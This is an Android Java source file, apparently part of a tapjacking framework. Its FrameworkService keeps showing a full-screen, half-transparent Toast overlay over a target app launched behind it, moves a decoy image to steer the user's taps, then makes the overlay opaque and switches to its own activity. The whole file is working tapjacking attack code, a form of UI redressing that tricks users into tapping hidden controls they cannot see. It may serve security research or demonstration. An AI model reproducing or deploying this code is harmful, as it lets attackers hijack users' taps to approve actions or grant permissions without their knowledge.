package com.tapjacking.framework;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Point;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Toast;


public class FrameworkService extends Service {

	public static final int opacity = 128;
	private static FrameworkPayload payload = null;
	private static View mainView = null;

	public static void setLoad(FrameworkPayload payload) {
		FrameworkService.payload = payload;
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		LayoutInflater inflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
		Toast toast = Toast.makeText(getApplicationContext(), "", Toast.LENGTH_SHORT);
		mainView = inflater.inflate(R.layout.layout, null);
		mainView.getBackground().setAlpha(opacity);
		View bugImage = mainView.findViewById(R.id.image);
		if(bugImage != null && payload != null) {
			Point p = payload.getFirst();
			bugImage.setPadding(p.x, p.y, 0, 0);
		}
		toast.setView(mainView);
		toast.setGravity(Gravity.FILL, 0, 0);
		fireLongToast(toast);
		launch();
	}

	static Handler h = new Handler() {
		@Override
		public void dispatchMessage(Message msg) {
			if(payload != null)
				payload.moveImage(mainView.findViewById(R.id.image));
		}
	};

	private void fireLongToast(final Toast toast) {
		Thread t = new Thread() {
			public void run() {
				int count = 0;
				int sleep = 100;
				int max_count = 1;
				if(payload!=null) max_count = payload.getNumMoves();
				try {
					while (true && count < max_count) {
						toast.setView(mainView);
						toast.show();

						if (count == max_count - 1) {
							mainView.getBackground().setAlpha(255);
							ComponentName toLaunch;
							toLaunch = new ComponentName(
									"com.tapjacking.framework",
									"com.tapjacking.framework.MainActivity");
							Intent intent = new Intent();
							intent.addCategory(Intent.CATEGORY_LAUNCHER);
							intent.setComponent(toLaunch);
							intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
							getApplication().startActivity(intent);
						}

	
						if(payload!=null) sleep = payload.getSleep();
						sleep(sleep);
						count++;
						h.sendEmptyMessage(0);
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
				stopSelf();
			}
		};
		t.start();
	}

	private void launch() {
		Thread t = new Thread() {
			public void run() {
				try {
					sleep(2000);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
				if(payload != null && payload.getIntent() != null)
					getApplication().startActivity(payload.getIntent());
			}
		};
		t.start();
	}
}